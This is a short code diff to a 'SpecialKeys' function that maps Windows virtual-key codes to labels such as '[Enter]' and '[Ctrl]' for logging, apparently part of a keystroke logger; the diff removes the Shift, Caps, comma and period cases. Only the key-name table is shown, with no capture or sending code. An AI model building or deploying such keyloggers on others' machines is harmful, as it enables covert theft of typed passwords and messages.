@@ -15,17 +15,11 @@ bool SpecialKeys(int S_Key) {//Special Keys log
 	case VK_RETURN://0x0D
 		LOG("[Enter]");
 		return true;
-	case VK_SHIFT://0x10
-		LOG("[Shift]");
-		return true;
 	case VK_CONTROL://0x11
 		LOG("[Ctrl]");
 		return true;
 	case VK_MENU://0x12
 		LOG("[Alt]");
-		return true;
-	case VK_CAPITAL://0x14
-		LOG("[Caps]");
 		return true;
 	case VK_ESCAPE://0x1B
 		LOG("[Esc]");
@@ -110,12 +104,6 @@ bool SpecialKeys(int S_Key) {//Special Keys log
 		return true;
 	case VK_F12://0x7B
 		LOG("[F12]");
-		return true;
-	case VK_OEM_COMMA://0xBC
-		LOG(", ");
-		return true;
-	case VK_OEM_PERIOD://0xBE
-		LOG(". ");
 		return true;
 	default:
 		return false;
